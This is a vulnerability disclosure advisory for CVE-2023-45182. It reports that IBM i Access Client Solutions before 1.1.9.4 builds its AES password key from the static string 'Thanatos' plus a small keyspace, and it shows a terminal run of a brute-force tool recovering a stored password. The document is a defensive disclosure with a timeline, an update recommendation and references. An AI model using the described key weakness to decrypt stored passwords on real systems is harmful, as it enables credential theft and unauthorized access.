# CVE-2023-45182
IBM i Access Client Solutions < 1.1.9.4 - Weak password encryption 

## Timeline
- Vulnerability reported to vendor: 22.09.2023
- New fixed 1.1.9.4 version released: 08.12.2023
- Public disclosure: 15.12.2023

## Description

IBM i Access Client Solutions for storing user passwords uses AES algorith however 16 bytes encryption key is the combination of static string (`Thanatos`) and random characters from string which consists of another static string (`Behemoth`) combined with username, users' home folder, OS (for example `Linux`) combined with current directory where the application was started. As a result half of the encryption key is static (string `Thanatos`) whereas the second half is very limited. This makes it very easy for an attacker to brute force password even on a single CPU core.

Here is an example of password decryption of `mmajchrowicz` user using the `as400_password_bruteforce_tool.java` script from the `mkubiak` account:
```
┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ java as400_password_bruteforce_tool.java mmajchrowicz_funciton_admin_work.bin Linux mmajchrowicz /opt

IBM AS400 Password Bruteforce Tool v0.3 by Michał Majchrowicz AFINE Team

Full keyspace: mmajchrowiczLinux/opt/home/mmajchrowiczBehemoth
Full keyspace length: 47

Reduced keyspace: BmajchrowizLnux/pte
Reduced keyspace length: 19

Found good pass: Thanatosaun/Lcmo

Encrypted system password 7 bytes:
2E 1B 10 0A 1B 0D 0A
Decrypted system password 7 bytes:
50 65 6E 74 65 73 74

Decrypted system password: Pentest
```

This problem was caused by application of weak password encryption. This issue is fixed in IBM i Access Client Solutions 1.1.9.4.

## Affected versions
< 1.1.9.4

## Advisory
Update IBM i Access Client Solutions to 1.1.9.4 or newer.

### References
* https://www.ibm.com/support/pages/node/7091942
* https://nvd.nist.gov/vuln/detail/CVE-2023-45182
